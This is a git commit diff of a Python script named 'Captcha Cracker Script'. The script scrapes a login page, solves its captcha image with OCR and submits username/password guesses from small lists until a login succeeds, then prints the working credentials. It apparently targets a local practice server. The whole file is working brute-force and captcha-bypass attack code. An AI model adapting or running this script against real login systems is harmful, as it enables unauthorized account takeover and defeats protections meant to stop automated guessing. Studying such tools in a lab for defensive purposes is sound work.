de31804b06598a754d3eac3e1a1ff4af1e7333ca
MarwahSalehAmeen <marwahsaleh@hotmail.com>
2024-05-25 16:03:15 +0300

    Captcha Cracker Script

--- CaptchaCracker.py
+++ CaptchaCracker.py
@@ -4,49 +4,50 @@ from io import BytesIO
 import pytesseract
 from bs4 import BeautifulSoup
 import time
+from urllib.parse import unquote
 
-pytesseract.pytesseract.tesseract_cmd = r'C:\Users\USER\AppData\Local\Tesseract-OCR\tesseract.exe'
-# Function to solve captcha using pytesseract
+
 def solve_captcha(image_url):
     response = requests.get(image_url)
     img = Image.open(BytesIO(response.content))
     captcha_text = pytesseract.image_to_string(img)
-    return captcha_text
+    return unquote(captcha_text.strip())  
 
-# Function to brute force the password
+
 def brute_force_password():
-    base_url = "http://192.168.205.128:5000/"  # Update with your actual URL
+    base_url = "http://127.0.0.1:5000/"  
     session = requests.Session()
-    
-    while True:
-        # Visit login page to get captcha
+    username_list = ['admin', 'test', 'username']
+    password_list = ['admin', 'test', 'password']
+    for i in range(len(username_list)):
+
         login_page = session.get(base_url)
         soup = BeautifulSoup(login_page.content, 'html.parser')
         captcha_image_url = base_url + soup.find('img')['src']
         
-        # Download and solve captcha
+
         captcha_text = solve_captcha(captcha_image_url)
         
-        # Extract csrf token
-        csrf_token = soup.find('input', {'name': 'csrf_token'})['value']
-        
-        # Submit login form with brute force password
+
         login_data = {
-            'username': 'username',
-            'password': 'password',  # Replace with your brute force password logic
+            'username': username_list[i],
+            'password': password_list[i],  
             'captcha': captcha_text,
-            'csrf_token': csrf_token
         }
         
         login_response = session.post(base_url, data=login_data)
-        
-        # Check if login successful
+
+
         if login_response.url.endswith('/success'):
-            print("Password found:", login_data['password'])
+            print("Successful login!")
+            print("    - Username found:", login_data['username'])
+            print("    - Password found:", login_data['password'])
             break
+        else:
+            print("Failed login....")
+
         
-        # Delay to avoid being blocked
         time.sleep(1)
 
-# Call the brute force function
+
 brute_force_password()
